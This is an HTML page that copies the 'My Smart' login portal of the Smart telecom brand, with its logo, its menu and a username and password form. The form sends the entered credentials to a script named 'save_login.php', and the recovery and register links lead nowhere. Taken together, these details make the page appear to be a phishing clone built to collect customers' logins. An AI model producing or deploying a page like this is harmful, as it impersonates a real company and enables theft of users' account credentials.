<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My Smart Login</title>

<style>
    /* General body */
    body { 
        font-family: Arial, sans-serif; 
        margin: 0; 
        background: #f5f5f5; 
        color: #333; 
    }

    /* Navbar */
    .navbar { 
        background: white; 
        padding: 20px 60px; 
        display: flex; 
        align-items: center;
        gap: 40px; 
        border-bottom: 1px solid #ddd; 
    }
    .navbar img { 
        height: 40px; 
    }
    .navbar a { 
        text-decoration: none; 
        color: #555; 
        font-size: 18px; 
        font-weight: 500; 
    }

    /* Main container */
    .container { 
        display: flex; 
        justify-content: space-between; 
        padding: 60px; 
        flex-wrap: wrap;
    }

    /* Left content */
    .left { 
        width: 45%; 
        padding-top: 40px; 
        min-width: 300px;
    }
    .left h1 { 
        font-size: 36px; 
        font-weight: bold; 
        margin-bottom: 20px; 
    }
    .left ul { 
        line-height: 2; 
        font-size: 18px; 
        color: #666; 
        padding-left: 20px;
    }

    /* Right login box */
    .right { 
        background: white; 
        width: 40%; 
        padding: 40px; 
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1); 
        min-width: 300px;
    }
    .right img { 
        display: block; 
        margin: 0 auto 20px; 
        height: 85px; 
    }
    .right h2 { 
        text-align: center; 
        margin-bottom: 20px; 
        font-weight: normal; 
    }

    input[type="text"], input[type="password"] {
        width: 100%; 
        padding: 15px; 
        margin-top: 10px; 
        margin-bottom: 20px;
        border-radius: 5px; 
        border: 1px solid #ccc; 
        font-size: 16px;
        box-sizing: border-box;
    }

    button {
        width: 100%; 
        padding: 15px; 
        background: #0077cc; 
        color: white;
        border: none; 
        border-radius: 5px; 
        font-size: 18px; 
        cursor: pointer;
    }
    button:hover {
        background: #005fa3;
    }

    .forgot { 
        display: block; 
        margin-bottom: 20px; 
        color: #0077cc; 
        font-size: 16px; 
        text-decoration: none;
    }
    .forgot:hover {
        text-decoration: underline;
    }

    .right p { 
        font-size: 16px; 
        text-align: center;
    }
    .right a { 
        color: #0077cc; 
        text-decoration: none; 
        font-weight: bold; 
    }
    .right a:hover {
        text-decoration: underline;
    }

    /* Responsive for smaller screens */
    @media(max-width: 900px){
        .container { flex-direction: column; padding: 20px; }
        .left, .right { width: 100%; margin-bottom: 40px; }
    }
</style>
</head>

<body>

<!-- Navbar -->
<div class="navbar">
    <img src="smart.logo.png" alt="Smart Logo">
    <a href="#">Postpaid</a>
    <a href="#">Prepaid</a>
    <a href="#">Bro</a>
    <a href="#">International</a>
    <a href="#">Help</a>
</div>

<!-- Main container -->
<div class="container">
    <div class="left">
        <h1>Create a My Smart Account now</h1>
        <ul>
            <li>Monitor your account balance and usages real-time</li>
            <li>Manage and settle your bills online</li>
            <li>Enjoy Smart latest promos and offers</li>
        </ul>
    </div>

    <div class="right">
        <img src="smart.logo.png" alt="Smart Logo">
        <h2>Enter your My Smart details</h2>

        <form action="save_login.php" method="POST">
            <input type="text" name="user" placeholder="Mobile number or Email Address" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>

        <a href="#" class="forgot">Forgot password?</a>
        <p>Don't have an account? <a href="#">Register</a></p>
        <p>Do you have an enterprise account? <a href="#">Click here</a></p>
    </div>
</div>

</body>
</html>
